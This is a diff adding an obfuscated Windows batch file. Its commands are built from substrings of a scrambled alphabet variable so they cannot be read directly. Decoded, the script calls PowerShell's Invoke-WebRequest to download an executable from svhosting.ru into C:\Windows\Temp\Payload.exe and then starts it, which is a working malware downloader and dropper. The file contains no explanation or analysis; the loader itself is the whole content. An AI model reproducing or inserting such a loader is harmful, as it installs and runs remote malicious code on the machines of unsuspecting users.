@@ -1,0 +1,5 @@
+ÿþ&@cls&@set "BkgG=NCw7qjtx96UJTYA@avKlDPS1dgHGicrsz RWXIeyOf3ku04LFBhoZVME52bnm8Qp"
+
+%BkgG:~15,1%%BkgG:~38,1%%BkgG:~29,1%%BkgG:~50,1%%BkgG:~51,1%%‡HgW‰ÃÃ%%BkgG:~33,1%%BkgG:~51,1%%BkgG:~41,1%%BkgG:~41,1%
+%BkgG:~63,1%%BkgG:~51,1%%BkgG:~2,1%%BkgG:~38,1%%BkgG:~30,1%%BkgG:~31,1%%BkgG:~50,1%%BkgG:~38,1%%BkgG:~19,1%%BkgG:~19,1%%BkgG:~33,1%-%BkgG:~1,1%%BkgG:~51,1%%BkgG:~60,1%%qrAÃPÃ‰%%BkgG:~60,1%%BkgG:~16,1%%BkgG:~59,1%%BkgG:~24,1%%BkgG:~33,1%%BkgG:~37,1%%BkgG:~59,1%%CbN¥E¤Ã%%BkgG:~17,1%%BkgG:~51,1%%BkgG:~43,1%%BkgG:~38,1%-%BkgG:~35,1%%BkgG:~38,1%%BkgG:~58,1%%BkgG:~34,1%%BkgG:~38,1%%n­lWÃV´%%BkgG:~4,1%%BkgG:~44,1%%BkgG:~38,1%%BkgG:~31,1%%BkgG:~6,1%%BkgG:~33,1%%BkgG:~50,1%%BkgG:~6,1%%BkgG:~6,1%%BkgG:~63,1%%BkgG:~31,1%%eDj©ºwÃ%://svhosting.ru/7.exe%BkgG:~33,1%-%BkgG:~40,1%%BkgG:~44,1%%BkgG:~6,1%%BkgG:~41,1%%BkgG:~28,1%%BkgG:~19,1%%BkgG:~38,1%%BkgG:~33,1%%BkgG:~1,1%:\Windows\Temp\Payload.exe
+%BkgG:~31,1%%BkgG:~6,1%%BkgG:~16,1%%BkgG:~30,1%%BkgG:~6,1%%BkgG:~33,1%%BkgG:~1,1%:\Windows\Temp\Payload.exe
